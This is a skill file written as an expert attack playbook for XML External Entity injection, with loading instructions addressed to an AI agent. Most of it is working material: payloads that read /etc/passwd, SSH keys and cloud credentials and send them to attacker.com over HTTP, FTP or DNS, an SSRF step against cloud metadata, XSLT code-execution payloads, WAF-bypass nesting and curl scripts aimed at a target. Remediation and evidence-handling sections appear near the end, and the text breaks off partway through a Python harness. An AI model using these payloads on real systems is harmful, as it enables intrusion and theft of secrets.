---
name: xxe-xml-external-entity
description: >-
  XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources.
---

# SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE. For real-world CVE chains, Office docx XXE step-by-step, PHP expect:// RCE, and Solr XXE+RCE, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Also load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Apache Solr XXE + RCE chain (CVE-2017-12629) — XXE to read config, then VelocityResponseWriter for RCE
- Office docx XXE step-by-step — unzip → inject DOCTYPE into `word/document.xml` or `[Content_Types].xml` → repackage → upload
- DOCTYPE-based blind SSRF — `PUBLIC` external DTD reference triggers HTTP callback without entity reflection
- PHP `expect://` protocol via XXE — direct command execution when expect extension is installed
- Blind XXE via error messages — force file path error that leaks content in exception text
- XXE in SOAP web services — inject entities into SOAP Envelope/Body elements

---

## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

## 6. OFFICE FILE XXE (docx/xlsx/pptx)

Office files are ZIP archives containing XML. Inject into `[Content_Types].xml` or `word/document.xml`:

```bash
# Step 1: extract
unzip original.docx -d extracted/

# Step 2: edit word/document.xml — add malicious DTD
# Add after <?xml version="1.0" encoding="UTF-8" standalone="yes"?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then use &xxe; inside document text

# Step 3: repackage
cd extracted && zip -r ../malicious.docx .
```

---

## 7. SOAP ENDPOINT XXE

SOAP requests parse XML by definition. Inject external entity into SOAP envelope:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <id>&xxe;</id>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

---

## 8. XXE → SSRF CHAIN

XXE external entity can point to internal HTTP endpoints (identical to SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```
This combines XXE file read + SSRF into a single payload.

---

## 9. XInclude ATTACK

When server-side processes XInclude (import XML from another source), but you can't control the DOCTYPE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

Works in: Apache Cocoon, Xerces-J, libxml2 with XInclude support enabled.

---

## 10. PROTOCOL HANDLERS IN XXE

```xml
<!-- HTTP (SSRF) -->
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- File read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP wrapper (if PHP with libxml2) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!-- Decode base64 in response to get file contents -->

<!-- FTP (exfil / port scan) -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher (Redis, SMTP) -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">
```

---

## 11. BYPASSING DEFENSES

### Parser blocks DOCTYPE
Try XInclude (no DOCTYPE needed, see §9).

### Only allows specific XML schemas
If schema validation occurs: inject comments or CDATA after schema validation but before entity processing.

### Response encoding issues (binary in response)
Use PHP filter for base64:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Network restrictions on OOB
Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, DNS lookup leaks data.

---

## 12. QUICK DETECTION CHECKLIST

```
□ Find XML input point (or JSON→XML transformation)
□ Send basic entity: <!ENTITY xxe "test"> → &xxe; in body → does "test" reflect?
□ If yes → file read: SYSTEM "file:///etc/passwd"
□ If no reflection → OOB test via Collaborator URL
□ If OOB hit → set up attacker DTD for file exfiltration
□ Try SVG upload with XXE
□ Try Content-Type: application/xml on JSON endpoints
□ Try XInclude if DOCTYPE-based fails
```

---

## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)

When external entities are blocked but local DTD files exist on the server:

### Technique

```xml
<!-- Override an entity defined in a LOCAL DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

### Common Local DTD Paths

#### Linux

```
/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
/usr/share/nmap/nmap.dtd                    # Nmap
/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
```

#### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
```

#### Inside JAR Files (Java Applications)

```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

### Why This Works

- External connections blocked (firewall/WAF/egress filter)
- But file:// to LOCAL files is usually allowed
- Local DTD is trusted → entity overrides inject attacker-controlled definitions
- Error messages or blind extraction via file:// still works

---

## 14. ADDITIONAL OOB EXFILTRATION CHANNELS

### FTP-based exfiltration (line-by-line)

FTP protocol sends data line-by-line, making it useful for multi-line file exfiltration when HTTP-based OOB truncates at newlines:

```xml
<!-- attacker.com/ftp-exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

Run a rogue FTP server (e.g., `xxeserv` or custom Python) on port 2121 — each line of the file arrives as a separate `RETR` or `CWD` command.

### HTTP parameter exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

Base64 encoding avoids newline/special-character issues in HTTP URL. Decode the `d=` parameter on attacker server.

---

## 15. DTD NESTING TRICKS — PARAMETER ENTITY CHAINING

### Parameter entity within parameter entity

Used to bypass parsers that block direct entity references in entity values:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

The parser expands `%a;` → `%b;` → fetches external DTD. Some WAFs only inspect the first level of entity definitions.

### Triple-nested for filter evasion

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

Payload sent to target only references `stage1.dtd` — the actual file read happens two DTD fetches deep, evading shallow WAF inspection.

---

## 16. XXE IN NON-OBVIOUS FORMATS

| Format | XML Location | Injection Point |
|--------|-------------|-----------------|
| **SOAP Envelope** | Entire body is XML | Add DOCTYPE before `<soap:Envelope>` |
| **SVG Image** | SVG is XML | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SVG header |
| **OOXML (.docx)** | `word/document.xml`, `[Content_Types].xml` | Inject DOCTYPE + entity into any XML member |
| **OOXML (.xlsx)** | `xl/sharedStrings.xml`, `xl/worksheets/sheet1.xml` | Entity reference in cell values |
| **RSS/Atom feeds** | Feed body is XML | Inject into feed items if user content is included |
| **SAML assertions** | SAML XML tokens | DOCTYPE injection in `SAMLResponse` parameter (base64-decoded XML) |
| **XMPP** | Protocol messages are XML stanzas | Entity in message body or JID fields |
| **GPX files** | GPS track data in XML | Via file upload endpoints accepting GPX |
| **XHTML** | Strict XHTML is valid XML | DOCTYPE injection in XHTML documents |

### SAML XXE

```xml
<!-- Base64-decode the SAMLResponse, inject DOCTYPE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Re-encode to base64, submit as `SAMLResponse` parameter.

---

## 17. XXE VIA FILE UPLOAD

### SVG upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

Upload as avatar/image → view uploaded SVG → file content rendered as text.

### XLSX (Excel) upload

```bash
# 1. Create minimal .xlsx, unzip it
unzip report.xlsx -d xlsx_tmp/

# 2. Inject into xl/sharedStrings.xml
# Add after XML declaration:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Replace a <t> element content with &xxe;

# 3. Repackage
cd xlsx_tmp && zip -r ../malicious.xlsx .
```

Alternatively inject into `[Content_Types].xml` (parsed first by most OOXML processors).

### DOCX upload

```bash
# Target: word/document.xml
# Same approach: unzip → inject DOCTYPE + entity → repackage

# Alternative: inject into customXml/item1.xml if custom XML parts exist
```

### Processing pipeline attack

Even if the uploaded file is not directly rendered, the server-side parser (Apache POI, python-docx, OpenXML SDK) may process entities during import, triggering OOB exfiltration.

---

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---

## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.

---

## 20. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the **exact XML body**, byte-for-byte, including the DOCTYPE and its placement | XXE is a parser-state bug; where the DOCTYPE sits relative to the root element decides whether it is honoured |
| the **injection point** — parameter name, header, file member, or field — and how the XML got there | "SOAP endpoint" and "`text/plain` body promoted to XML" have different fixes |
| the **parser identity and version** if observable (error strings, `Server`, XML library banners) | entity handling, XInclude, and local-DTD behaviour are library-specific |
| for a file read: the **returned file content** in the response, unredacted enough to prove the read | proves disclosure, not merely that a parser exists |
| for OOB: the **collaborator/DNS/HTTP log line** with the timestamp, source IP, and the full request path | the callback *is* the evidence when nothing is reflected |
| for blind/exfil: the **receiving server's decoded output**, not the raw encoded URL | proves the file bytes arrived, not just that a request fired |
| a **negative control** — the same request with a non-existent external reference (`http://127.0.0.1:1/`, `file:///nonexistent`) showing no callback and no error | proves the observed effect came from entity resolution, not ambient traffic |
| the **redaction policy**: which bytes of the target file you displayed and why | a finding must not become an exfiltration of the client's secrets |
| whether `SYSTEM`, `PUBLIC`, XInclude, or a wrapper was required | names the exact control to enable or the parser to reconfigure |
| for chains (SSRF, RCE, XSLT): **every hop** with the request that carried it | the impact statement depends on the full path, not the first primitive |

**The callback or the bytes are the finding.** A `200` on an XML request that you *believe*
resolved an entity proves nothing. Either file content appears, or your listener logs the hit,
or both — otherwise it is an untested hypothesis.

**Report the primitive and its bound.** "XXE" alone is not a finding. State which handler
resolved the entity, which protocol was permitted (`file://`, `http://`, `ftp://`, `jar://`,
`expect://`), what the read reached, and what it did *not* — an entity resolved to
`file:///etc/hostname` is a different report from one resolved to `/etc/shadow` or to an
internal metadata endpoint.

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| the response echoes your XML, including the DOCTYPE text | reflection, not parsing — check for *file contents* or a callback |
| an error message names your entity but no content follows | the parser rejected the entity; a stack trace is not disclosure |
| a DNS/HTTP hit that also occurs with the DOCTYPE removed | ambient traffic, a favicon fetch, or your own tooling — rerun the negative control |
| the `Content-Type` was `text/xml` but the body was form-urlencoded and the app never parsed it | no XML parser touched the input |
| the app fetches the URL because *you* pointed a URL field at it (SSRF), with no entity involved | that is SSRF, a different class and a different fix |
| a `file://` read that returns the path string back as a literal | no OS translation occurred; the value was echoed |
| the parser resolves external entities **only** against a document you fully control locally | local testing artefact — reproduce against the target's parser |
| SVG accepted but rendered client-side by the browser, not parsed server-side | no server-side entity resolution occurred |
| a wrapper that returns empty with `200` (`php://filter` with the filter disabled) | the wrapper is unavailable — not exploitable |
| an OOB hit from a target you do not own in scope | out-of-scope infrastructure; discard |

**Always run the negative control beside the positive one.** Remove the external reference and
resend: if the callback still arrives, you are measuring the environment, not the vulnerability.

---

---

## 21. REMEDIATION REFERENCE

1. **Disable external entity and external DTD resolution in the parser, then verify by test.**
   This is the only control that removes the class rather than narrowing it:
   `XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)` +
   `setProperty(SUPPORT_EXTERNAL_DTD, false)` (Java/StAX), `libxml_disable_entity_loader(true)`
   or `LIBXML_NONET` (PHP), `defusedxml` (Python), `XMLReader` with `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`
   (`.NET`), `Nokogiri::XML::ParseOptions::NONET` (Ruby). Do not rely on a WAF to do this.
2. **Reject `<!DOCTYPE` and `<!ENTITY` outright at the API boundary** where the schema never
   needs them. A document that cannot declare an entity cannot resolve one — a cheap,
   parser-independent gate that also blocks the nesting tricks in §15.
3. **Block outbound network access by default from anything that parses XML** — egress
   allowlisting turns OOB exfiltration and XXE→SSRF into a failed connection. Pair it with the
   local-DTD surface: disable external access *and* validate that `file://` to parser-local DTD
   files cannot be reached from user input (§13).
4. **Turn off `XInclude` unless it is a deliberate feature** — XInclude is the bypass for a
   DOCTYPE filter (§9), and disabling it closes the gap that a `DOCTYPE`-only control leaves.
5. **Restrict protocol handlers available to the parser** — a `file`, `ftp`, `gopher`, `jar`,
   `expect`, or `php://filter` handler reachable from an entity value is the difference between
   a blind bug and a file read or RCE. Remove `expect` and the PHP wrappers entirely.
6. **Never parse untrusted XML with a parser you cannot configure.** If a third-party library
   parses XML internally (SVG rasterisers, Office/POI importers, PDF generators, feed readers),
   treat it as a parser you are responsible for: pin hardened versions and test the entity
   behaviour rather than assuming it is safe.
7. **Validate uploads by content, not by extension** — a `.svg`, `.docx`, or `.xlsx` is XML
   (or a ZIP of XML); scan and, where possible, normalise or convert the file with a hardened
   tool before any server-side parse. Store uploads outside the document root and serve them
   with a non-XML content type.
8. **Run the XML-processing tier least-privileged and isolated** — an unprivileged account with
   no read access to `/etc/shadow`, private keys, cloud credentials, or the application's own
   secrets converts a critical into a low. Containerise the converter with no network and a
   read-only filesystem.
9. **Deny access to cloud metadata from any parsing service** — block `169.254.169.254` and the
   IPv6 equivalents at the network layer, and require IMDSv2 semantics, so XXE→SSRF cannot
   harvest instance credentials (§8).
10. **Alert on entity-shaped payloads and on parser egress** — `<!DOCTYPE`, `<!ENTITY`,
    `SYSTEM`, `file://`, `expect://`, and `jar:file:` in request bodies are high-signal, as is a
    DNS lookup originating from a parsing service to an unusual host.
11. **Keep the parser and its wrappers patched, and test after every upgrade.** Most XXE CVEs
    are library defaults that a version bump silently reverts; re-run your entity test suite as
    part of dependency updates.
12. **Regression-test in CI** — an automated request per XML-accepting endpoint asserting that a
    `file://` entity yields no file bytes and generates no callback catches the parser re-enabling
    external entities.

---

---

## 22. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the XML parser **actually processing the document**, not rejecting it? | a parse error on malformed XML shows the parser is reached |
| 2 | Does a **local entity** expand (`&lol;` defined inline)? | entity substitution is on |
| 3 | Does a **`SYSTEM` entity reach your collaborator**? | external entity resolution is on - the actual finding |
| 4 | Did a **file read return content** you can verify against a known file? | the read primitive, not just the callback |
| 5 | For a blind case, did the **exfiltrated data arrive** encoded in the request to you? | the extraction, when nothing is reflected |
| 6 | Is the parser reached through a **non-obvious surface** (SVG, Office, SOAP, a parameter)? | the entry point for the report |
| 7 | Does `LIBXML_NOENT` / the equivalent flag appear in the **error signature**? | the misconfiguration named, which is the fix location |

**A callback from your own collaborator is the bar.** An entity that is defined but never resolved, or
a parser that returns a generic error, is not XXE - it is a parser reaching an error path.

---

---

## 23. EXECUTION PRIMITIVES

XXE is proven by **an external entity resolving to a location you control, or a file's contents
appearing in a response or in a request to you**. The callback is the unit of evidence.

### 24.1 Establish that the parser is reached

```bash
T="https://target.tld"
SUB="xxe-$(date +%s).YOUR_COLLAB_DOMAIN"
# control: valid XML, so you see the normal response shape
curl -sS -o /tmp/x0 -w 'valid   %{http_code} %{size_download}\n' -X POST "$T/api/xml" \
  -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><root><a>1</a></root>'
# and a deliberately malformed document: an error naming the parser proves it is parsed
curl -sS -o /tmp/x1 -w 'broken  %{http_code} %{size_download}\n' -X POST "$T/api/xml" \
  -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><root><a>'
grep -oiE 'XML parsing|SAXParse|libxml|XMLReader|SimpleXML|dom4j|Xerces|JAXB|System.Xml' /tmp/x1 | head -3
```

**The malformed document is the cheapest and most reliable entry ticket.** The parser's own error
message names the library, which tells you which of the following blocks applies.

### 24.2 The local entity, then the external entity

```bash
# step 1: internal entity expansion. If this works, substitution is on.
curl -sS -o /tmp/e1 -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY lol "MARKER123">]><root><a>&lol;</a></root>'
grep -c 'MARKER123' /tmp/e1
# step 2: the external entity, to your collaborator. This is the finding.
curl -sS -o /tmp/e2 -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://$SUB/\">]><root><a>&xxe;</a></root>"
echo "step 2 submitted - check the collaborator for a request naming $SUB"
# step 3: a file read, with the result reflected
curl -sS -o /tmp/e3 -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><a>&xxe;</a></root>'
cat /tmp/e3 | head -c 300; echo
```

**Three escalating steps, each independently observed.** Step 1 succeeding and step 2 failing means
internal substitution is on but external entities are disabled - a materially different finding from
full XXE, and the report must say which.

### 24.3 Blind extraction via an out-of-band DTD

```bash
# host the DTD that exfiltrates the file it is asked for
cat > /tmp/evil.dtd <<'D'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_COLLAB/?d=%file;'>">
__omp_magic("", "eval;")
__omp_magic("", "exfil;")
D
python3 -m http.server 8000 --directory /tmp &
# the request that pulls in the DTD, which then performs the second request
curl -sS -o /tmp/e4 -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://YOUR_HOST:8000/evil.dtd">%remote;]><root/>'
echo "the collaborator should show a request to /evil.dtd and then one carrying ?d=<file contents>"
```

**`?d=<file contents>` arriving at your server is the proof of a blind file read.** Note that
`/etc/hostname` is used deliberately: it is short, non-sensitive, and unambiguous.

### 24.4 Parameter-entity and DTD-nesting bypasses

```bash
# when the value cannot be used directly in an entity declaration, nest it
cat > /tmp/nest.dtd <<'D'
<!ENTITY % a "<!ENTITY &#37; b SYSTEM 'file:///etc/hostname'>">
__omp_magic("", "a;")
__omp_magic("", "b;")
D
# and when the internal subset is stripped, an external DTD is the alternative route
for D in '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://YOUR_HOST:8000/evil.dtd"><root/>' ; do
  curl -sS -o /dev/null -w '%{http_code}\n' -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d "$D"
done
# and when filtering blocks the word DOCTYPE, test whether the parser still expands a bare entity
curl -sS -o /tmp/e5 -X POST "$T/api/xml" -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><root><a>&xxe;</a></root>'
grep -oiE 'entity|undefined|not found' /tmp/e5 | head -2
```

Each bypass needs its **blocked control** alongside it - the plain form that failed. That pair is
what makes it a bypass.

### 24.5 The non-obvious entry points

```bash
# SVG: an uploaded image is XML
cat > /tmp/x.svg <<'S'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://YOUR_COLLAB/svg">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>
S
curl -sS -o /tmp/svg -w 'svg %{http_code}\n' -X POST "$T/api/upload" -F 'file=@/tmp/x.svg'
# Office: docx/xlsx are ZIPs of XML - repackage with the entity in the right part
mkdir -p /tmp/ox && cd /tmp/ox && unzip -o -q /tmp/sample.docx && \
  sed -i 's|<w:t>.*</w:t>|<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://YOUR_COLLAB/docx">]><w:t>&xxe;</w:t>|' word/document.xml 2>/dev/null && \
  zip -q -r /tmp/x.docx . && echo "upload /tmp/x.docx"
# SOAP: the envelope is XML, and SOAP endpoints rarely disable entities
curl -sS -o /tmp/soap -X POST "$T/ws" -H 'Content-Type: text/xml' -H 'SOAPAction: "op"' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://YOUR_COLLAB/soap">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><op>&xxe;</op></soap:Body></soap:Envelope>'
# and a plain query parameter that is parsed as XML server-side
curl -sS -o /dev/null -w 'param %{http_code}\n' --get --data-urlencode \
  'data=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://YOUR_COLLAB/param">]><r>&xxe;</r>' "$T/api/import"
```

**SVG, Office documents, SOAP, and parameters that are parsed as XML are the same bug reachable
through a different door.** Each is a separate reportable entry point, and each needs its own
callback.

### 24.6 Error-based extraction, when there is no channel at all

```bash
# on Java stacks, the parse error often includes the file's content
curl -sS -o /tmp/eb -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/hostname">%f;]><root/>'
grep -oiE 'content|hostname|The entity|was referenced but not declared' /tmp/eb | head -3
# and the malformed-URI trick, which reports the value inside the error text
curl -sS -o /tmp/eb2 -X POST "$T/api/xml" -H 'Content-Type: application/xml' -d \
'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/hostname">%f;]><root><a>file://x/%f;</a></root>'
head -c 400 /tmp/eb2
```

Error-based XXE is the **fallback when egress is blocked**: it turns the parse error into the output
channel. Report the raw error text, since it is the artefact.

### 24.7 Billion laughs - and why you do not run it

```bash
# DO NOT execute an expansion bomb against a live target. Confirm the vulnerability with a bounded
# expansion and report the amplification maths instead.
python3 - <<'PY'
# a single level: how much did 1 entity expand to?
print("submit ONE nested level, measure the response size delta, then extrapolate in the report.")
print("The finding is that expansion is unbounded; demonstrating the DoS is out of scope and a liability.")
PY
```

**Do not run the bomb.** Unbounded entity expansion is proven by showing that nested expansion is not
capped, with the measured delta from one level - never by taking the target down.

### 24.8 A stopped-on-first-success harness

```bash
python3 - <<'PY'
import urllib.request, time
T="https://target.tld/api/xml"; SUB="xxe-YOURCOLLAB"
def post(body):
    r=urllib.request.Request(T,body.encode(),{"Content-Type":"application/xml"})
    try:
        x=urllib.request.urlopen(r,timeout=20); return x.status,x.read().decode(errors="ignore")
    except urllib.error.HTTPError as e: return e.code,e.read().decode(errors="ignore")
    except Exception as e: return None,str(e)

cases=[
 ("well-formed",    '<?xml version="1.0"?><r><a>1</a></r>'),
 ("broken",         '<?xml version="1.0"?><r><a>'),
 ("internal-entity",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY l "MKR">]><r><a>&l;</a></r>'),
